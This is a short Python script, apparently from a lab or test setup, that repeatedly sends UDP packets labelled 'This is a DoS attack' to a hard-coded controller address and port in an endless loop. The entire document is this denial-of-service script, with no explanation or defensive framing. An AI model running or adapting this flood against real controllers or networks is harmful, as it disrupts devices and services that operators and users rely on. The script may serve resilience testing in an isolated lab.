import socket
import time

# Input controller IP address
ip_address = "172.16.0.100"
# Input controller port
udp_port = 28191
message = "This is a DoS attack"

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
clientSocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

while True:
    clientSocket.sendto(message.encode("utf-8"), (ip_address, udp_port))
    time.sleep(0.5)
